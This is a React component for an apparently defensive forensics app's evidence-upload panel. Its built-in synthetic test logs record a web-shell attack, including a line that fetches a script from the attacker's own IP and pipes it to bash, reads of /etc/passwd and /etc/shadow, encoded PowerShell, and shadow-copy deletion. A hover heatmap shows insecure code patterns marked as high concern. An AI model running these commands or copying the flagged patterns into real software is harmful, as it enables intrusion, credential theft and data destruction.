import React, { useState, useRef } from 'react';
import { useApp } from '../store';
import { UploadCloud, FileText, CheckCircle2, AlertTriangle, RefreshCw, Sparkles, Hash, Eye } from 'lucide-react';
import { ParserType } from '../types';

interface UploadDropzoneProps {
  caseId: string;
  onUploadSuccess?: () => void;
}

export const UploadDropzone: React.FC<UploadDropzoneProps> = ({ caseId, onUploadSuccess }) => {
  const { uploadEvidence, currentUser, setCurrentPage, setAuthNotice } = useApp();
  const fileInputRef = useRef<HTMLInputElement>(null);

  const [isDragging, setIsDragging] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [selectedParser, setSelectedParser] = useState<ParserType | 'auto'>('auto');
  const [recentUploads, setRecentUploads] = useState<{ name: string; hash: string; events: number; status: string }[]>([]);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [hoveredTile, setHoveredTile] = useState<{ index: number; snippet: string } | null>(null);

  const handleFiles = async (files: FileList | null) => {
    if (!currentUser) {
      setAuthNotice('Please sign in to upload digital evidence. If you do not have an account, please register.');
      setCurrentPage('login');
      return;
    }
    if (!files || files.length === 0) return;
    setIsProcessing(true);
    setErrorMessage(null);

    const uploadsSummary: { name: string; hash: string; events: number; status: string }[] = [];

    for (let i = 0; i < files.length; i++) {
      const file = files[i];

      // Check max size (100 MB per FR-EVID-4)
      if (file.size > 100 * 1024 * 1024) {
        setErrorMessage(`File ${file.name} exceeds maximum allowed size of 100 MB.`);
        continue;
      }

      try {
        const parserOverride = selectedParser === 'auto' ? undefined : selectedParser;
        const result = await uploadEvidence(caseId, file, parserOverride);
        uploadsSummary.push({
          name: result.filename,
          hash: result.sha256_hash,
          events: result.event_count,
          status: result.status
        });
      } catch (err: any) {
        setErrorMessage(`Failed to process ${file.name}: ${err.message}`);
      }
    }

    setRecentUploads(prev => [...uploadsSummary, ...prev]);
    setIsProcessing(false);
    if (onUploadSuccess && uploadsSummary.length > 0) {
      onUploadSuccess();
    }
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    handleFiles(e.dataTransfer.files);
  };

  // Preset quick synthetic evidence inject for instant testing
  const injectSampleEvidence = async (sampleType: 'nginx_webshell' | 'linux_auth' | 'windows_powershell') => {
    if (!currentUser) {
      setAuthNotice('Please sign in to upload digital evidence. If you do not have an account, please register.');
      setCurrentPage('login');
      return;
    }
    setIsProcessing(true);
    let filename = '';
    let content = '';

    if (sampleType === 'nginx_webshell') {
      filename = `nginx_dmz_breach_${Date.now()}.log`;
      content = `198.51.100.42 - - [22/Sep/2026:03:10:45 +0000] "POST /uploads/avatar_temp.php HTTP/1.1" 200 412 "-" "Python-urllib/3.10"
198.51.100.42 - - [22/Sep/2026:03:14:22 +0000] "POST /uploads/shell.php?cmd=whoami;id;uname%20-a HTTP/1.1" 200 84
198.51.100.42 - - [22/Sep/2026:03:18:01 +0000] "GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 2410
198.51.100.42 - - [22/Sep/2026:03:25:30 +0000] "POST /uploads/shell.php?cmd=curl%20http://198.51.100.42:8000/linpeas.sh|bash HTTP/1.1" 200 12040`;
    } else if (sampleType === 'linux_auth') {
      filename = `auth_compromise_${Date.now()}.log`;
      content = `Sep 22 03:20:10 web01 sshd[4102]: Failed password for invalid user admin from 198.51.100.42 port 51221 ssh2
Sep 22 03:20:12 web01 sshd[4104]: Failed password for invalid user root from 198.51.100.42 port 51223 ssh2
Sep 22 03:22:15 web01 sudo: www-data : TTY=pts/1 ; PWD=/var/www/html/uploads ; USER=root ; COMMAND=/bin/bash
Sep 22 03:35:40 web01 auditd[1124]: type=SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0=/etc/shadow
Sep 22 03:52:04 web01 ssh[4912]: OpenSSH_9.2 initiated connection from 192.168.1.50:52188 to 192.168.1.10:22 user admin_backup`;
    } else {
      filename = `sysmon_powershell_${Date.now()}.json`;
      content = JSON.stringify([
        {
          EventID: 4688,
          TimeCreated: new Date().toISOString(),
          TargetUserName: "finance_svc",
          Computer: "ws-fin-04.corp.local",
          NewProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          CommandLine: "powershell.exe -enc JABzAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA...",
          Message: "Process Creation: Obfuscated Encoded PowerShell Execution"
        },
        {
          EventID: 4688,
          TimeCreated: new Date().toISOString(),
          TargetUserName: "finance_svc",
          Computer: "ws-fin-04.corp.local",
          NewProcessName: "C:\\Windows\\System32\\vssadmin.exe",
          CommandLine: "vssadmin delete shadows /all /quiet",
          Message: "Process Creation: Volume Shadow Copy Purge"
        }
      ], null, 2);
    }

    const file = new File([content], filename, { type: 'text/plain' });
    await uploadEvidence(caseId, file);
    setIsProcessing(false);
    if (onUploadSuccess) onUploadSuccess();
  };

  // 36 heatmap tiles matching Screenshot 2 concern matrix
  const concernTiles = [
    { level: 'high', code: 'import bcrypt\ndef hash_password(password):\n  salt = bcrypt.gensalt()\n  return bcrypt.hashpw(password, salt)' },
    { level: 'high', code: 'def check_password(password, hashed):\n  return bcrypt.checkpw(password, hashed)' },
    { level: 'medium', code: 'OPENSSL_CIPHER_SUITE = "ECDHE-RSA-AES256-GCM-SHA384"' },
    { level: 'low', code: 'SESSION_EXPIRY = 28800 # 8 hours max token lifetime' },
    { level: 'high', code: 'eval(base64_decode($_POST["cmd"])) # Unsafe dynamic execution' },
    { level: 'medium', code: 'SSH_ALLOW_TCP_FORWARDING = false' },
    { level: 'high', code: 'SELECT * FROM users WHERE id = " + user_input + "' },
    { level: 'low', code: 'FIPS_MODE_ENABLED = true # SP 800-86 compliant' },
    { level: 'medium', code: 'CORS_ALLOWED_ORIGINS = ["https://dcsre.corp"]' },
    { level: 'high', code: 'chmod -R 777 /etc/forensics/custody_chain.db' },
    { level: 'medium', code: 'ALLOW_ROOT_SSH_LOGIN = false' },
    { level: 'low', code: 'AUDIT_LOG_TAMPER_SEAL = SHA256_HMAC' },
    { level: 'high', code: 'subprocess.Popen(shell=True, args=untrusted_arg)' },
    { level: 'low', code: 'RATE_LIMIT_BUCKET = 5 # failed attempts window 15m' },
    { level: 'medium', code: 'TLS_STRICT_SNI_CHECK = true' },
    { level: 'high', code: 'vssadmin delete shadows /all /quiet # Ransomware indicator' }
  ];

  return (
    <div className="space-y-4">
      {/* Configuration & Dropzone Card */}
      <div className="bg-[#161413]/90 border border-[#2b2523] rounded-2xl p-6 shadow-xl space-y-5">
        
        {/* Top Controls */}
        <div className="flex flex-wrap items-center justify-between gap-4 pb-4 border-b border-[#2b2523]">
          <div>
            <h3 className="text-sm font-semibold text-[#fafaf9]">Evidence Ingestion & Integrity Validator</h3>
            <p className="text-xs text-[#a8a29e] mt-0.5">
              Supports Linux syslog, Windows EVTX/Sysmon, Web server logs, PCAP summaries, XML, JSON & CSV.
            </p>
          </div>

          {/* Parser selector */}
          <div className="flex items-center gap-2 text-xs">
            <span className="text-[#78716c] font-mono text-[11px]">Parser Target:</span>
            <select
              value={selectedParser}
              onChange={(e) => setSelectedParser(e.target.value as any)}
              className="bg-[#100f0e] border border-[#2e2926] rounded-lg px-2.5 py-1 text-[#d6d3d1] text-xs focus:outline-none focus:border-[#f95721] font-mono"
            >
              <option value="auto">Auto-Detect by Format & MIME</option>
              <option value="web_server">Nginx / Apache Web Server Log</option>
              <option value="linux_auth">Linux Auth / Syslog</option>
              <option value="windows_evtx">Windows Event Logs (EVTX/JSON)</option>
              <option value="pcap_summary">PCAP Network Summary CSV</option>
              <option value="generic_json_csv">Generic Forensic CSV / JSON</option>
            </select>
          </div>
        </div>

        {/* Drag and Drop Area + Screenshot 2 Concern Heatmap side-by-side */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5 items-stretch">
          
          {/* Main Dropzone (7 cols) */}
          <div
            onDragOver={(e) => { e.preventDefault(); setIsDragging(true); }}
            onDragLeave={() => setIsDragging(false)}
            onDrop={handleDrop}
            onClick={() => {
              if (!currentUser) {
                setAuthNotice('Please sign in to upload digital evidence. If you do not have an account, please register.');
                setCurrentPage('login');
                return;
              }
              fileInputRef.current?.click();
            }}
            className={`lg:col-span-7 relative border-2 border-dashed rounded-xl p-6 text-center cursor-pointer transition-all flex flex-col items-center justify-center min-h-[160px] ${
              isDragging
                ? 'border-[#f95721] bg-[#2a140d]/40 shadow-[0_0_15px_rgba(249,87,33,0.3)]'
                : 'border-[#332c28] hover:border-[#f95721]/60 bg-[#110f0e]/80 hover:bg-[#141210]'
            }`}
          >
            <input
              ref={fileInputRef}
              type="file"
              multiple
              className="hidden"
              accept=".log,.txt,.evtx,.pcap,.pcapng,.csv,.json,.pdf,.xml"
              onChange={(e) => handleFiles(e.target.files)}
            />

            <div className="flex flex-col items-center justify-center space-y-2">
              <div className="w-11 h-11 rounded-xl bg-[#221712] border border-[#ea580c]/40 flex items-center justify-center text-[#f95721] shadow-inner">
                {isProcessing ? (
                  <RefreshCw className="w-5 h-5 animate-spin text-[#f95721]" />
                ) : (
                  <UploadCloud className="w-5 h-5" />
                )}
              </div>

              <div>
                <p className="text-sm font-medium text-[#fafaf9]">
                  {isProcessing ? 'Streaming cryptographic SHA-256 hash & parsing...' : (
                    <span>Drag & drop files or <span className="text-[#f95721] underline underline-offset-2 font-semibold">Browse</span></span>
                  )}
                </p>
                <p className="text-[11px] text-[#78716c] mt-0.5 font-mono">
                  Supported formats: LOG, TXT, EVTX, PCAP, CSV, JSON, XML, PDF (Max 100 MB)
                </p>
              </div>

              <div className="inline-flex items-center gap-1.5 text-[10px] text-[#a8a29e] font-mono pt-1">
                <Hash className="w-3 h-3 text-[#f95721]" />
                <span>SHA-256 computed client-side · Strict Chain of Custody</span>
              </div>
            </div>
          </div>

          {/* Screenshot 2: Concern Heatmap Matrix (5 cols) */}
          <div className="lg:col-span-5 rounded-xl bg-[#100f0e] border border-[#2b2523] p-4 flex flex-col justify-between relative">
            <div className="flex items-center justify-between text-[11px] font-mono text-[#a8a29e] mb-2">
              <span className="flex items-center gap-1.5 text-[#fafaf9] font-medium">
                <span className="w-2 h-2 rounded-full bg-[#f95721]" />
                <span>Evidence Ingestion Heatmap</span>
              </span>
              <div className="flex items-center gap-2 text-[10px]">
                <span className="flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-sm bg-[#eab308]" /> Low</span>
                <span className="flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-sm bg-[#f97316]" /> Mod</span>
                <span className="flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-sm bg-[#f95721]" /> High</span>
              </div>
            </div>

            {/* Glowing Squares Grid matching Screenshot 2 */}
            <div className="grid grid-cols-8 gap-1.5 py-1">
              {concernTiles.map((tile, idx) => (
                <div
                  key={idx}
                  onMouseEnter={() => setHoveredTile({ index: idx, snippet: tile.code })}
                  onMouseLeave={() => setHoveredTile(null)}
                  className={`aspect-square rounded-sm cursor-pointer transition-all duration-200 hover:scale-110 relative ${
                    tile.level === 'high'
                      ? 'bg-[#f95721] hover:shadow-[0_0_8px_#f95721]'
                      : tile.level === 'medium'
                      ? 'bg-[#ea580c] opacity-80'
                      : 'bg-[#b45309] opacity-60'
                  }`}
                />
              ))}
            </div>

            {/* Floating Concern Code Preview Popover (Screenshot 2) */}
            {hoveredTile && (
              <div className="absolute top-12 left-4 right-4 z-20 p-3 bg-[#181615] border border-[#ea580c]/60 rounded-xl shadow-2xl animate-fadeIn space-y-1">
                <div className="flex items-center justify-between text-[10px] font-mono text-[#fb923c]">
                  <span className="flex items-center gap-1 font-semibold">
                    <Eye className="w-3 h-3" />
                    <span>Concern preview</span>
                  </span>
                  <span className="text-[#78716c]">Target #{hoveredTile.index + 1}</span>
                </div>
                <pre className="text-[10px] font-mono text-[#fafaf9] bg-[#0c0b0a] p-2 rounded border border-[#2b2523] overflow-x-auto whitespace-pre-wrap">
                  {hoveredTile.snippet}
                </pre>
              </div>
            )}

            <div className="text-[10px] font-mono text-[#78716c] pt-2 border-t border-[#24201e] flex justify-between">
              <span>Automated Forensic Triage</span>
              <span className="text-[#fb923c]">42% Controls Evaluated</span>
            </div>
          </div>

        </div>

        {/* Quick Sample Injectors for Instant Testing & Demonstrations */}
        <div className="pt-4 border-t border-[#2b2523] flex flex-wrap items-center justify-between gap-3 text-xs">
          <div className="flex items-center gap-1.5 text-[#a8a29e]">
            <Sparkles className="w-3.5 h-3.5 text-[#f95721]" />
            <span>Load synthetic forensic test artifacts:</span>
          </div>

          <div className="flex flex-wrap gap-2">
            <button
              onClick={() => injectSampleEvidence('nginx_webshell')}
              disabled={isProcessing}
              className="px-3 py-1 rounded-lg bg-[#191716] hover:bg-[#25201d] border border-[#2c2724] text-[#d6d3d1] font-mono text-[11px] transition-colors hover:text-[#f95721]"
            >
              + Web Shell Nginx Log
            </button>
            <button
              onClick={() => injectSampleEvidence('linux_auth')}
              disabled={isProcessing}
              className="px-3 py-1 rounded-lg bg-[#191716] hover:bg-[#25201d] border border-[#2c2724] text-[#d6d3d1] font-mono text-[11px] transition-colors hover:text-[#f95721]"
            >
              + Linux Auth & Sudo Log
            </button>
            <button
              onClick={() => injectSampleEvidence('windows_powershell')}
              disabled={isProcessing}
              className="px-3 py-1 rounded-lg bg-[#191716] hover:bg-[#25201d] border border-[#2c2724] text-[#d6d3d1] font-mono text-[11px] transition-colors hover:text-[#f95721]"
            >
              + PowerShell EVTX/Sysmon JSON
            </button>
          </div>
        </div>

        {/* Error Notification */}
        {errorMessage && (
          <div className="p-3 bg-red-950/50 border border-red-800/80 rounded-lg flex items-center gap-2 text-xs text-red-300">
            <AlertTriangle className="w-4 h-4 text-red-400 shrink-0" />
            <span>{errorMessage}</span>
          </div>
        )}

      </div>

      {/* Recent Uploads Table */}
      {recentUploads.length > 0 && (
        <div className="bg-[#161413]/90 border border-[#2b2523] rounded-2xl p-4 shadow-xl">
          <h4 className="text-xs font-semibold text-[#fafaf9] uppercase font-mono mb-2.5 flex items-center gap-2">
            <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
            Recent Upload Ingestion Batch
          </h4>
          <div className="space-y-2">
            {recentUploads.map((up, i) => (
              <div
                key={i}
                className="flex flex-wrap items-center justify-between gap-2 p-2.5 bg-[#100f0e] border border-[#282321] rounded-xl text-xs"
              >
                <div className="flex items-center gap-2">
                  <FileText className="w-3.5 h-3.5 text-[#f95721]" />
                  <span className="font-medium text-[#e7e5e4]">{up.name}</span>
                </div>
                <div className="flex items-center gap-4 text-[#a8a29e] font-mono text-[11px]">
                  <span>SHA-256: <strong className="text-[#fafaf9] font-normal">{up.hash.slice(0, 16)}...</strong></span>
                  <span>Extracted: <strong className="text-[#f95721]">{up.events} events</strong></span>
                  <span className="text-emerald-400 font-semibold">{up.status}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};
